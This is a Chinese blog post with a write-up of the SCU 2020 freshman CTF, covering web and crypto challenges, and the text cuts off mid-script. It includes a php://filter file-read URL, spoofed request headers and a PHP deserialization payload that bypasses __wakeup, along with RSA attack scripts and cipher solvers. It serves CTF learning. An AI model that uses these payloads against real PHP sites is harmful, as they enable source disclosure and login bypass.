<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>SCU-2020-新生赛 | 欢迎纱布们的到来</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="没啥好说的 ​">
<meta property="og:type" content="article">
<meta property="og:title" content="SCU-2020-新生赛">
<meta property="og:url" content="http://example.com/2020/12/16/SCU-2020-%E6%96%B0%E7%94%9F%E8%B5%9B/index.html">
<meta property="og:site_name" content="欢迎纱布们的到来">
<meta property="og:description" content="没啥好说的 ​">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2020-12-16T08:14:09.000Z">
<meta property="article:modified_time" content="2020-12-16T08:14:44.000Z">
<meta property="article:author" content="Papaya">
<meta property="article:tag" content="re">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="欢迎纱布们的到来" type="application/atom+xml">
  
  
    <link rel="icon" href="/images/pig.ico">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/plugin/bganimation/bg.css">

  

  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://i.loli.net/2020/09/25/QDZN6PSqghdjAUR.jpg">
    <h2 class="author">Papaya</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>29</strong><br>文章</div></a>
      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
      <a href="/tags"><div><strong>5</strong><br>标签</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>主页</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>归档</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分类</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>标签</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main"><article id="post-SCU-2020-新生赛" class="wow slideInRight article article-type-post"
  itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/12/16/SCU-2020-%E6%96%B0%E7%94%9F%E8%B5%9B/" class="article-date">
  <time class="post-time" datetime="2020-12-16T08:14:09.000Z" itemprop="datePublished">
    <span class="post-month">12月</span><br/>
    <span class="post-day">16</span>
  </time>
</a>

  </div>
  <div class="article-inner">
    
    
    <header class="article-header">
      
  
    <h1 class="article-title" itemprop="name">
      SCU-2020-新生赛
    </h1>
  

      <div>
        
        
        

        
      </div>
    </header>
    
    <div class="article-entry" itemprop="articleBody">
      
      <p>没啥好说的</p>
<p>​    <a id="more"></a></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="真的是签到题"><a href="#真的是签到题" class="headerlink" title="真的是签到题"></a>真的是签到题</h3><p>截图即可</p>
<h3 id="情感日记"><a href="#情感日记" class="headerlink" title="情感日记"></a>情感日记</h3><p>两个部分 就在日记里</p>
<h3 id="easyhtml"><a href="#easyhtml" class="headerlink" title="easyhtml"></a>easyhtml</h3><p>源代码注释</p>
<h3 id="我爬我爬"><a href="#我爬我爬" class="headerlink" title="我爬我爬"></a>我爬我爬</h3><p>robots.txt 得到ffflllaaaggg.html 访问得到base64编码 解码得到flag</p>
<h3 id="看我后面"><a href="#看我后面" class="headerlink" title="看我后面"></a>看我后面</h3><p>index.php.bak得到源码，弱比较，传入5201314得到flag</p>
<h3 id="normalPHP"><a href="#normalPHP" class="headerlink" title="normalPHP"></a>normalPHP</h3><p>base64被过滤 用base32</p>
<p>?file=php://filter/read=convert.base32-encode/resource=flag.php</p>
<h3 id="easyheehee"><a href="#easyheehee" class="headerlink" title="easyheehee"></a>easyheehee</h3><p>查看相应头 lookme 两次base64解码得到ffflllaaaggg.php 访问得到flag</p>
<h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Referer: http://scuctf.com</span><br><span class="line">User-Agent: 0x401Browser</span><br><span class="line">via: hgg.com</span><br></pre></td></tr></table></figure>

<p>scuctf{i_am_a_powerful_hacker}</p>
<h3 id="渣男记录"><a href="#渣男记录" class="headerlink" title="渣男记录"></a>渣男记录</h3><p><a target="_blank" rel="noopener" href="http://www.zip得到源码,select做参数/">www.zip得到源码，select做参数</a> 反序列化</p>
<p>wakeup修改了username 当手动设置的参数大于实际参数可以绕过wakeup</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select=O:4:&quot;Love&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;i:520;&#125;</span><br></pre></td></tr></table></figure>

<p>scuctf{sadsa541-azhanana-2xzsdz}</p>
<h3 id="打比赛不如看剧"><a href="#打比赛不如看剧" class="headerlink" title="打比赛不如看剧"></a>打比赛不如看剧</h3><p>binwalk 得到图片 dd提取</p>
<p>找到一模一样的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13797431.html">题目</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$string = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"><span class="keyword">print</span> (strlen($string).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($a = <span class="number">0</span>; $a &lt; <span class="number">62</span>; $a++) &#123;</span><br><span class="line">    <span class="keyword">for</span> ($b = <span class="number">0</span>; $b &lt; <span class="number">62</span>; $b++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($c = <span class="number">0</span>; $c &lt; <span class="number">62</span>; $c++) &#123;</span><br><span class="line">            $flag = $string[$a] . $string[$b] . $string[$c];</span><br><span class="line">            $token = md5($flag);</span><br><span class="line">            <span class="keyword">if</span> (substr($token, <span class="number">7</span>, <span class="number">1</span>) === substr($token, <span class="number">9</span>, <span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>, <span class="number">1</span>) === substr($token, <span class="number">17</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((intval(substr($token, <span class="number">1</span>, <span class="number">1</span>)) + intval(substr($token, <span class="number">14</span>, <span class="number">1</span>)) + substr($token, <span class="number">17</span>, <span class="number">1</span>)) / substr($token, <span class="number">1</span>, <span class="number">1</span>) === intval(substr($token, <span class="number">31</span>, <span class="number">1</span>))) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> $flag . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>scuctf{k0ngfu_ma_make_me_happ1}</p>
<h3 id="有手就行"><a href="#有手就行" class="headerlink" title="有手就行"></a>有手就行</h3><p>见<a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/110001506">hgg博客</a></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="classic-1"><a href="#classic-1" class="headerlink" title="classic_1"></a>classic_1</h3><p>凯撒加密，偏移13</p>
<h3 id="classic-2"><a href="#classic-2" class="headerlink" title="classic_2"></a>classic_2</h3><p>十六进制解密，base64解密，摩斯电码，加上{}</p>
<p>SCUCTF{041918FC1EF6348768578F505F69D197}</p>
<h3 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA_1"></a>RSA_1</h3><p>e=3 爆破k攻击 c-k*n可以开三次方即得到m</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = <span class="number">892408374578063131162925795619920779766603018609992406621503024400320421262482556891045333045408815199768659578199823419716777827460090306221618906101139272423449131313434967763664295600593363990276765767066758967765012850672428517786210813209127040442832574380675662826137452780727264357</span></span><br><span class="line">n = <span class="number">17076697689025821279984148703479525857912324396375097877800474725170566885465833732966897433803722770843910606215420934526050277173030062927090405120718833473629930226217051580832179577629652910778242159108718885516149768995851175071714817922775555170553827627677999093195969471873530031984433631909841287167351534954860426002075822101506835880510505034002629168205724869128357383388034971402180363910826536064357845040799329301895842061729319929568340334416516796267886218679042058969927331452548377324349084816441144473807565907927986545026739667157223640848553663532280797054758912745891410981282851031085852562257</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 破解密文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span>(gmpy2.iroot(cipher+i*n, <span class="number">3</span>)[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">            flag_bin = int(gmpy2.iroot(cipher+x*n, <span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line">            flag = hex(flag_bin)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_for</span>():</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">118720000</span>):</span><br><span class="line">        <span class="keyword">if</span>(gmpy2.iroot(cipher+x*n, <span class="number">3</span>)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">            flag_bin = int(gmpy2.iroot(cipher+x*n, <span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line">            print(flag_bin)</span><br><span class="line">            flag = hex(flag_bin)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag_for()</span><br><span class="line">    <span class="comment"># get_flag()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里python3的decode出了点问题 用python2去decode</p>
<p>scuctf{8ef98504b1acb7c8c8976e60f53d9325}</p>
<h3 id="math-1"><a href="#math-1" class="headerlink" title="math_1"></a>math_1</h3><p>EXCRT 抄一份代码 <a target="_blank" rel="noopener" href="https://paste.ubuntu.com/p/dQ95wX3k5k/">EXP</a></p>
<p>scuctf{234970795255267031279059393553}</p>
<h3 id="RSA-2"><a href="#RSA-2" class="headerlink" title="RSA_2"></a>RSA_2</h3><p>分解n得到三个质数，但是不影响欧拉函数，python3还是没法decode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import gmpy2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a1 = gmpy2.mpz(199045230832669039221046041578658179479)</span></span><br><span class="line"><span class="string">a2 = gmpy2.mpz(319438022064098846441615805897528174851)</span></span><br><span class="line"><span class="string">a3 = gmpy2.mpz(334688613728124045578795340681788885633)</span></span><br><span class="line"><span class="string">e = gmpy2.mpz(0x10001)</span></span><br><span class="line"><span class="string">c = gmpy2.mpz(</span></span><br><span class="line"><span class="string">    7162732898109470668490761172640544970587920562229245172318483665877098759808623298921271357899945260719802967519239)</span></span><br><span class="line"><span class="string">phi = (a1-1)*(a2-1)*(a3-1)</span></span><br><span class="line"><span class="string">d = gmpy2.invert(e, phi)</span></span><br><span class="line"><span class="string">print(d)</span></span><br><span class="line"><span class="string">m = pow(c, d, a1*a2*a3)</span></span><br><span class="line"><span class="string">print(m)</span></span><br><span class="line"><span class="string">print(hex(m)[2:].decode(&#x27;hex&#x27;))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">m = <span class="number">962767036565814783947965746329011592709220079643113763709122300620030874381407453748116812542077</span></span><br><span class="line"><span class="keyword">print</span> hex(m)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>scuctf{e063d03aff353073c24617bd4b483f90}</p>
<h3 id="math-2"><a href="#math-2" class="headerlink" title="math_2"></a>math_2</h3><p>直接网站在线解决，有两个j满足，选小的那一个</p>
<p><a target="_blank" rel="noopener" href="https://www.wolframalpha.com/input/?i=x%5E2+mod+8497980875583539713991243773941802042180496489377326522174599746685528850719812035800799014030522052269804143947777659192760008656733593814889715667890907+=+11451419198101926081719260817111">跳转</a></p>
<h3 id="RSA-3"><a href="#RSA-3" class="headerlink" title="RSA_3"></a>RSA_3</h3><p>short_pad_attack 找博客 找代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n</span>):</span></span><br><span class="line">    PRxy.&lt; x, y &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt; xn &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt; xz, yz &gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 = x ^ e - c1</span><br><span class="line">    g2 = (x+y) ^ e - c2</span><br><span class="line"></span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line"></span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">    diff = h.small_roots(X=<span class="number">114514191981019260817</span>, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt; x &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x ^ e - c1</span><br><span class="line">    g2 = (x+diff) ^ e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = <span class="number">91271647735744709097708757371810693819959773890255602892321052899291140524662404139036987856738557165460502348870154514187118388083897953512262523467951513248663220055679646915049292032986252072883347567763269025940548912246834125522235064649335386094011441612211361270863086815851273615300955370973053395447</span></span><br><span class="line">    c1 = <span class="number">8473924177689385097361186953656797062650227841190040965380473377780644233766714939608585534305414668494659709275756172697799483669925043356688884324887478394528746881611781366747757023562008158800275672858865552852268001893</span></span><br><span class="line">    c2 = <span class="number">8473924177689385097361186953656797062650227841190040969573197360345161215089076875501807117350711332682919389146002627145413765770680053006201105979670824332086933186715988612908312603963949643839015421185340358831260317777</span></span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    print(<span class="string">&quot;difference of two messages is %d&quot;</span> % diff)</span><br><span class="line"></span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    print(<span class="string">&quot;m1:&quot;</span>, m1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://sagecell.sagemath.org/">在线运行Sage</a></p>
<p>scuctf{RSA_with_simple_padding}</p>
<h3 id="baby-pad"><a href="#baby-pad" class="headerlink" title="baby_pad"></a>baby_pad</h3><p>最后pad_length是5  所以flag为 32-5 = 27位</p>
<h3 id="classic-3-未提交"><a href="#classic-3-未提交" class="headerlink" title="classic_3[未提交]"></a>classic_3[未提交]</h3><p><a target="_blank" rel="noopener" href="https://blog.soreatu.com/posts/case-study-cryptanalysis-of-vigenere-ciper/">词频分析</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line">alphabet = list(range(<span class="number">256</span>))</span><br><span class="line">LETTER_FREQUENCY = &#123;</span><br><span class="line">    <span class="string">&#x27; &#x27;</span>: <span class="number">0.25000</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>: <span class="number">0.12702</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>: <span class="number">0.09056</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="number">0.08167</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="number">0.07507</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>: <span class="number">0.06966</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="number">0.06749</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="number">0.06327</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="number">0.06094</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>: <span class="number">0.05987</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="number">0.04253</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>: <span class="number">0.04025</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="number">0.02782</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>: <span class="number">0.02758</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>: <span class="number">0.02406</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: <span class="number">0.02360</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="number">0.02228</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="number">0.02015</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>: <span class="number">0.01974</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="number">0.01929</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="number">0.01492</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="number">0.00978</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>: <span class="number">0.00772</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>: <span class="number">0.00153</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>: <span class="number">0.00150</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="number">0.00095</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="number">0.00074</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IndCo</span>(<span class="params">s</span>):</span></span><br><span class="line">    N = len(s)</span><br><span class="line">    frequency = [s.count(c) <span class="keyword">for</span> c <span class="keyword">in</span> alphabet]</span><br><span class="line">    <span class="keyword">return</span> sum(i**<span class="number">2</span> - i <span class="keyword">for</span> i <span class="keyword">in</span> frequency) / (N**<span class="number">2</span> - N)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CalKeyLength</span>(<span class="params">s</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> kl <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">38</span>):</span><br><span class="line">        subs = [s[i::kl] <span class="keyword">for</span> i <span class="keyword">in</span> range(kl)]</span><br><span class="line">        <span class="keyword">if</span> sum(IndCo(si) <span class="keyword">for</span> si <span class="keyword">in</span> subs) / kl &gt; <span class="number">0.06</span>:</span><br><span class="line">            <span class="keyword">if</span> all(map(<span class="keyword">lambda</span> x: kl % x, res)):</span><br><span class="line">                res.append(kl)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">score</span>(<span class="params">s</span>):</span></span><br><span class="line">    score = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s.lower():</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> LETTER_FREQUENCY:</span><br><span class="line">            score += LETTER_FREQUENCY[c]</span><br><span class="line">    <span class="keyword">return</span> score</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RecoverKey</span>(<span class="params">ct, kl</span>):</span></span><br><span class="line">    key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    subs = [ct[i::kl] <span class="keyword">for</span> i <span class="keyword">in</span> range(kl)]</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> subs:</span><br><span class="line">        scores = []</span><br><span class="line">        <span class="keyword">for</span> xor <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            xored_s = <span class="string">&#x27;&#x27;</span>.join(chr(c ^ xor) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">            <span class="keyword">if</span> all(c <span class="keyword">in</span> printable <span class="keyword">for</span> c <span class="keyword">in</span> xored_s):</span><br><span class="line">                scores.append((xor, score(xored_s)))</span><br><span class="line">        key += bytes([max(scores, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])[<span class="number">0</span>]])</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Vigenere_dec</span>(<span class="params">cipher, key</span>):</span></span><br><span class="line">    keyCircle = cycle(key)</span><br><span class="line">    pt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">        pt += chr(c ^ next(keyCircle))</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    cipher = bytes.fromhex(<span class="string">&#x27;1f124d150f1f460159124952072041541d584438011e0e175f780d1944190d1755451d0e141504470108120d264a05020918254a4d0b1c4e131644551d5c074d561517120d264a0802171739094144071a4604520849480c0a15131555442d1017080b1f3f17050e0b1f1759111e1d14150e4854085a07640d0108071b780b0b440e090a1e561345140b19150513434438021649010339070544010c461e5f181b57081a591b0849506401054913142546190c0b4e17125208085e440453544059052c1e5d490d0778130e11501a0e1211080e5311045b541d5844080903040c1825174144071a4604520849480c0a150104440b2e0f51080453400b1d07444e0d0111040a4144195d1754470b2e1e161b461e324609071d1e051e43594945074d5d13181207360d0312121b3f0c0c440e09041c431249471141150517120c230e51070b07400d03055010011360070e1417201954055544350d030e46143c0a4d0501050c141111024207104154085f440c0d121f011d7c461c07501b010756550a60104d541d1b6005640e1a1b01122446190c0b4e0b0159121b14150e4e5f5f590e641b190818077c46190c0b4e1612431e0858441c560154430d6e4a170a18533c0d0807501a0e1211051b57110a5b085442073201200d4a53240e0e18501f0b1a565508564406410154600d2b1b1a0e170778051a180803181e451e0e4144065b011b4318270e51080c533f1220440e090d1b58551b57010a5e061756506410201b4616390b094401204613600749571606596054590e641e190e460223160a12040d121e47124958070c471717120d264a14080903371806110104461c5f19121e&#x27;</span>)</span><br><span class="line">    cipher = <span class="string">b&#x27;&#x27;</span>.join(bytes([c - <span class="number">1</span>]) <span class="keyword">for</span> c <span class="keyword">in</span> cipher)</span><br><span class="line">    kls = CalKeyLength(cipher)</span><br><span class="line">    print(<span class="string">f&quot;All probable key length: <span class="subst">&#123;kls&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> kl <span class="keyword">in</span> kls:</span><br><span class="line">        key = RecoverKey(cipher, kl)</span><br><span class="line">        print(<span class="string">f&quot;Key: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">        print(Vigenere_dec(cipher, key))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    